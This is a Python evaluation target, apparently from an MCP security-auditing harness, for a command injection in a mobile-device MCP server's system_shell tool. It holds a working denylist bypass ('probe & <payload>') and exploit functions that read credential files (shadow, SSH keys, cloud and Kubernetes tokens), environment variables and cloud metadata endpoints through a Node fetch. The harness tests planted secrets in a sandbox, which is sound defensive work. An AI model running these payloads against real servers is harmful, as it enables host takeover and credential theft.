"""CVE-2026-81562: claude-in-mobile system_shell OS command injection.

The `system_shell` MCP tool passes its `command` argument through the `validateShellCommand`
denylist, then (3.10.2) into AdbClient.exec, which builds `adb <device-flag> shell <command>` and
runs it with execSync, i.e. `/bin/sh -c "adb shell <command>"` on the host. The 3.10.2 denylist
blocks `;`, `|`, backtick, `&&`, `||`, redirects and `$(` but not a lone `&`, so `probe & <payload>`
backgrounds the adb call and runs `<payload>` in the host shell, whose stdout is returned verbatim
in the tool response. The patched version (3.10.3) routes every adb call through
execFileSync(adb, argv) (no host shell) and adds `&`, `${}`, `<()`, `>()` and tab to the denylist,
so the call is refused.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

SERVICE = "holdout-2026-81562-claude-in-mobile"
PATCHED = "holdout-2026-81562-claude-in-mobile-patched"
TOOL = "system_shell"
HOME = "/tmp"  # the planted HOME (cve_planting_spec._HOME); $HOME-rooted places land here

AIM = re.compile(r" & ")  # the injection separator the benign call never carries

Exploit = Callable[[Places, MCPClientPort], Awaitable[None]]


def _inject(payload: str) -> str:
    # The lone `&` is what the 3.10.2 denylist misses and 3.10.3 blocks: a harmless adb token is
    # backgrounded and the real payload runs in the host shell.
    return f"probe & {payload}"


async def _shell(client: MCPClientPort, payload: str) -> None:
    await client.call_tool(TOOL, {"command": _inject(payload)})


def _cat(place_id: str) -> Exploit:
    async def exploit(places: Places, client: MCPClientPort) -> None:
        coords = places[place_id].coordinates
        raw = coords.path
        if raw is None:
            assert coords.paths is not None
            raw = coords.paths[0]
        await _shell(client, f"cat {resolve_container_path(raw, HOME)}")

    return exploit


def _fetch(place_id: str) -> Exploit:
    # curl/wget are on the denylist, so the endpoint is fetched with Node's global fetch. Arrow
    # functions carry `>` (denylisted), so the callbacks are written as `function(){}`.
    async def exploit(places: Places, client: MCPClientPort) -> None:
        coords = places[place_id].coordinates
        url = f"http://{coords.host}:80{coords.path}"
        payload = (
            f'node -e \'fetch("{url}").then(function(r){{return r.text()}})'
            f".then(function(t){{process.stdout.write(t)}})'"
        )
        await _shell(client, payload)

    return exploit


async def _read_env(places: Places, client: MCPClientPort) -> None:
    await _shell(client, f"printenv {places['proc-environ'].coordinates.name}")


async def _read_account(places: Places, client: MCPClientPort) -> None:
    await _shell(client, "whoami")


async def _read_hostname(places: Places, client: MCPClientPort) -> None:
    # The nonce is the --hostname, read through /etc/hostname (shared from the namespace holder);
    # the `hostname` command would read the unshared UTS namespace instead.
    await _shell(client, "cat /etc/hostname")


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool(TOOL, {"command": "pm list packages"})


_FILE_PLACES = (
    "etc-shadow",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
)
_HTTP_PLACES = ("imds", "ecs-task-credentials", "eks-pod-identity")

KEPT_PLACES: tuple[str, ...] = (
    *_FILE_PLACES,
    *_HTTP_PLACES,
    "proc-environ",
    "process-account-identity",
    "container-hostname",
)

_EXPLOITS: tuple[Exploit, ...] = (
    *(_cat(pid) for pid in _FILE_PLACES),
    *(_fetch(pid) for pid in _HTTP_PLACES),
    _read_env,
    _read_account,
    _read_hostname,
)


TARGET = CVETarget(
    cve_id="CVE-2026-81562",
    severity="CVSS 8.8 (v3.1, placeholder)",
    mechanism=MechanismClass.COMMAND_EXECUTION,
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=(SERVICE,),
    server_image=SERVICE,
    patched_image=PATCHED,
    # UNPRIVILEGED so process-account-identity can run under a seeded uid (a host-user launch
    # rejects account places); the host-side injection is uid-independent. has_network=False: the
    # three link-local endpoints are served inside the namespace holder on loopback.
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED, working_directory=HOME, has_network=False
    ),
    builder=command_injection_env,
    exploits=_EXPLOITS,
    benign=_benign,
    awaited_capability=None,
    note=(
        "OS command injection: the system_shell tool interpolates its command argument into a host "
        "shell string run with execSync, and the 3.10.2 denylist misses a lone `&`, so "
        "`probe & <payload>` runs an arbitrary host command as the server user."
    ),
    tools_filter=None,
)
